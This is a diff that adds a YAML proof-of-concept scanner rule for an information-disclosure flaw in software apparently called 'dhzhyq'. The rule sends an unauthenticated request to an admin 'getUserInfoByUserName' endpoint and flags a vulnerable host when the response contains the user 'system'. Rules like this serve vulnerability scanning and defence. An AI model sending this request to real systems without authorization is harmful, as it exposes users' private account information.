@@ -1,0 +1,13 @@
+name: poc-yaml-dhzhyq-user-getUserInfoByUserName
+rules:
+  - method: GET
+    path: /admin/user_getUserInfoByUserName.action?userName=system
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("system"))
+detail:
+    info: |
+      敏感信息泄露漏洞
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/8H0XGmUGodREBMiLbgcZ7g
